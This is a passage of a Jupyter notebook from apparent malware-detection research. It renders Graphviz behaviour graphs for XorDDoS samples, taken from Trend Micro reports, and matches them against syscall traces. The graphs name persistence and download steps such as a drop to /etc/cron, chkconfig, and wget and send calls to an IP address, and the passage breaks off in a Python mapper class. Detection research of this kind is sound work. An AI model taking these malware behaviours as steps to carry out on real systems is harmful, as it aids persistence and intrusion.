d=\"M756.22,-104.47C893.58,-104.48 1168.33,-100.52 1197.8,-69 1206.47,-59.72 1199.43,-48.76 1188.98,-39.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1190.94,-36.56 1180.94,-33.05 1186.57,-42.03 1190.94,-36.56\"/>\n<text text-anchor=\"middle\" x=\"1226.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1300.8\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1300.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M755.65,-102.57C902.4,-99.36 1211.9,-90.17 1255.8,-69 1267.19,-63.51 1276.99,-53.72 1284.52,-44.25\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1287.39,-46.24 1290.52,-36.12 1281.76,-42.08 1287.39,-46.24\"/>\n<text text-anchor=\"middle\" x=\"1298.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.clone</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffee97e0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"474pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 474.09 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 470.09,-127 470.09,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"142.3\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"142.3\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"27.3\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"27.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M110.55,-88.44C100.23,-82.85 88.96,-76.14 79.3,-69 68.28,-60.86 57.19,-50.55 48.09,-41.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"50.45,-38.81 40.97,-34.08 45.43,-43.69 50.45,-38.81\"/>\n<text text-anchor=\"middle\" x=\"96.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.read</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"99.3\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"99.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M133.6,-86.8C127.41,-74.58 119.01,-57.98 112.07,-44.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"115.19,-42.65 107.55,-35.31 108.94,-45.81 115.19,-42.65\"/>\n<text text-anchor=\"middle\" x=\"141.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.read</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"185.3\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"185.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M152.99,-87.15C156.44,-81.47 160.17,-75.04 163.3,-69 167.22,-61.42 171.1,-52.99 174.49,-45.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"177.77,-46.48 178.48,-35.91 171.33,-43.73 177.77,-46.48\"/>\n<text text-anchor=\"middle\" x=\"188.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.read</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"287.3\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"287.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M174.14,-88.45C185.67,-82.6 198.7,-75.73 210.3,-69 226.17,-59.79 243.33,-48.76 257.42,-39.4\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"259.39,-42.29 265.76,-33.82 255.5,-36.47 259.39,-42.29\"/>\n<text text-anchor=\"middle\" x=\"252.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"309.3\" cy=\"-105\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"309.3\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"432.3\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"432.3\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffeeb1f0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"338pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 337.84 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 333.84,-127 333.84,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"162.95\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"162.95\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"40.95\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"40.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M130.69,-88.47C119.96,-82.83 108.16,-76.09 97.95,-69 86.34,-60.94 74.45,-50.85 64.55,-41.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"66.8,-39.16 57.09,-34.93 62.04,-44.29 66.8,-39.16\"/>\n<text text-anchor=\"middle\" x=\"115.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.read</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"126.95\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"126.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M151.59,-87.01C148.18,-81.43 144.64,-75.09 141.95,-69 138.72,-61.7 135.94,-53.52 133.68,-45.91\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"136.99,-44.73 130.93,-36.04 130.25,-46.61 136.99,-44.73\"/>\n<text text-anchor=\"middle\" x=\"159.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.read</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"198.95\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"198.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M170.23,-86.8C175.32,-74.78 182.21,-58.51 187.97,-44.92\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"191.24,-46.17 191.92,-35.6 184.79,-43.44 191.24,-46.17\"/>\n<text text-anchor=\"middle\" x=\"201.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.read</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"286.95\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"286.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M191.82,-88.21C201.85,-82.45 213.06,-75.7 222.95,-69 235.81,-60.28 249.47,-49.8 260.84,-40.69\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"263.11,-43.36 268.68,-34.34 258.71,-37.91 263.11,-43.36\"/>\n<text text-anchor=\"middle\" x=\"260.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffee97e0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"609pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 608.77 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 604.77,-127 604.77,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"304.77\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"304.77\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"110.77\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"110.77\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M229.73,-100.34C146.06,-95.47 20.45,-85.5 5.77,-69 -16.77,-43.66 35.49,-30.05 74.08,-23.68\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"74.69,-27.13 84.04,-22.14 73.62,-20.21 74.69,-27.13\"/>\n<text text-anchor=\"middle\" x=\"28.77\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M227.8,-102.71C168.83,-99.91 94.35,-91.78 74.77,-69 66.36,-59.21 73.88,-47.53 84.19,-37.93\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.6,-40.48 91.99,-31.36 82.09,-35.12 86.6,-40.48\"/>\n<text text-anchor=\"middle\" x=\"100.27\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M232.36,-98.41C204.53,-93.63 173.53,-84.9 148.77,-69 139.04,-62.75 130.85,-53.09 124.59,-43.93\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"127.51,-41.99 119.2,-35.41 121.59,-45.73 127.51,-41.99\"/>\n<text text-anchor=\"middle\" x=\"185.77\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M281.58,-87.74C265.6,-77.08 243.58,-63.42 222.77,-54 197.99,-42.78 168.59,-33.74 146.13,-27.66\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"146.9,-24.24 136.34,-25.08 145.11,-31.01 146.9,-24.24\"/>\n<text text-anchor=\"middle\" x=\"270.27\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"304.77\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"304.77\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M304.77,-86.8C304.77,-75.16 304.77,-59.55 304.77,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"308.27,-46.18 304.77,-36.18 301.27,-46.18 308.27,-46.18\"/>\n<text text-anchor=\"middle\" x=\"327.77\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"424.77\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"424.77\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M327.43,-87.73C341.12,-77.93 358.92,-65.21 374.77,-54 382.36,-48.64 390.62,-42.84 398.19,-37.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"400.5,-40.19 406.69,-31.59 396.49,-34.46 400.5,-40.19\"/>\n<text text-anchor=\"middle\" x=\"396.77\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M373.12,-96.45C390.36,-91.29 407.22,-82.82 418.77,-69 424,-62.75 426.21,-54.43 426.92,-46.37\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"430.42,-46.18 427.1,-36.12 423.43,-46.05 430.42,-46.18\"/>\n<text text-anchor=\"middle\" x=\"448.77\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"525.77\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"525.77\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M377.43,-98.56C409.1,-93.87 445.75,-85.15 475.77,-69 487.6,-62.64 498.45,-52.59 506.99,-43.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"509.73,-45.34 513.6,-35.48 504.43,-40.77 509.73,-45.34\"/>\n<text text-anchor=\"middle\" x=\"519.77\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M382,-103.43C444.57,-101.13 525.69,-93.35 546.77,-69 553.15,-61.63 550.94,-52.05 546.04,-43.25\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"548.9,-41.23 540.47,-34.82 543.06,-45.09 548.9,-41.23\"/>\n<text text-anchor=\"middle\" x=\"575.27\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffeeb1f0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M60.82,-87.18C56.57,-81.8 52.57,-75.54 50.34,-69 47.3,-60.09 50.29,-50.87 55.22,-42.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"58.14,-44.75 61.15,-34.59 52.46,-40.65 58.14,-44.75\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.find</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M80.86,-86.98C81.87,-81.29 82.84,-74.9 83.34,-69 83.98,-61.54 83.52,-53.47 82.62,-46.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.07,-45.47 81.14,-36.09 79.15,-46.5 86.07,-45.47\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffee97e0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M60.82,-87.18C56.57,-81.8 52.57,-75.54 50.34,-69 47.3,-60.09 50.29,-50.87 55.22,-42.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"58.14,-44.75 61.15,-34.59 52.46,-40.65 58.14,-44.75\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.find</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M80.86,-86.98C81.87,-81.29 82.84,-74.9 83.34,-69 83.98,-61.54 83.52,-53.47 82.62,-46.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.07,-45.47 81.14,-36.09 79.15,-46.5 86.07,-45.47\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffeeb1f0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro2.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"176pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 176.34 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 172.34,-127 172.34,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M57.48,-87.29C52.57,-82 47.97,-75.75 45.34,-69 41.65,-59.49 45.6,-49.86 51.83,-41.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"54.65,-43.72 58.63,-33.9 49.39,-39.09 54.65,-43.72\"/>\n<text text-anchor=\"middle\" x=\"67.34\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M84.91,-87C88.31,-77.38 91.19,-65.1 89.34,-54 88.88,-51.24 88.23,-48.41 87.47,-45.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"90.72,-44.27 84.36,-35.8 84.05,-46.39 90.72,-44.27\"/>\n<text text-anchor=\"middle\" x=\"128.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">64._newselect</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffee97e0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import graphviz\n",
    "\n",
    "class ItemMapper:\n",
    "    def __init__(self) -> None:\n",
    "        self.mapper = {}\n",
    "        self.index_counter:int = 1\n",
    "        # self.pretty_name = {\n",
    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
